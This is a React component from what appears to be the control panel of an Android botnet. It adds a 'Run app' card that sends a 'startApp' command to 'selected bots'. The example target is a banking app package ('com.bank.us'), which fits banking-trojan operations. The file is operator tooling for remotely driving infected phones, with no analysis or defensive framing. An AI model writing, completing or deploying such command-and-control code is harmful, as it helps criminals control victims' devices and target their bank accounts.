import React from 'react';
import SettingsContext from '../../Settings';


// {"this":"~command~","name":"startApp","app":"com.bank.us"}
class RunApplication extends React.Component {

    constructor(props) {
        super(props);
        this.state = {
          app: ''
        }
    }

    onChangeApp = (e) => {
        this.setState({ 
            app: e.target.value
        });
    }

    onClickRunAPP = (e) => {
        SettingsContext.BotSendCommand('{"name":"startApp","app":"' + this.state.app + '"}');
        this.setState({ 
            app: ''
        });
    }

    render () {
        return (
            <React.Fragment>
                <div class="card animated fadeIn">
                <div class="card-body">
                    <h5 class="card-title">Run app</h5>
                    <h6 class="card-subtitle mb-2 text-muted">Run app on selected bots</h6>
                    <p class="card-text">
                        <input class="form-control" value={this.state.app} onChange={this.onChangeApp} placeholder="com.android.app" />
                    </p>
                    <button type="button" onClick={this.onClickRunAPP} class="btn btn-right btn-outline-success">Run app</button>
                </div>
                </div>
            </React.Fragment>
        );
    }
}

export default RunApplication;